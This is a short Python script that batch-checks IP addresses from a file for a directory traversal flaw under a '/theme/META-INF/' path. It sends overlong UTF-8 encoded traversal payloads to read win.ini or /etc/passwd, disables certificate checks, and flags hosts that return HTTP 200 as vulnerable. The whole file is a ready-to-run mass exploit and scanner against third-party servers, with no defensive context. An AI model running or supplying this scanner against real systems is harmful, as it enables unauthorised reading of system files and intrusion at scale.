import requests,time
requests.packages.urllib3.disable_warnings()

win_poc='/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
linux_poc='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'

for ip in open('ip.txt'):
    ip=ip.replace('\n','')
    vul_windows=ip+win_poc
    vul_linux=ip+linux_poc
    try:
        print('check->' + ip)
        win_code = requests.get(vul_windows,verify=False).status_code
        linux_code = requests.get(vul_linux,verify=False).status_code

        if win_code == 200 or linux_code == 200:
            print(ip + '|有漏洞')
    except Exception as err:
        print('connecting error')

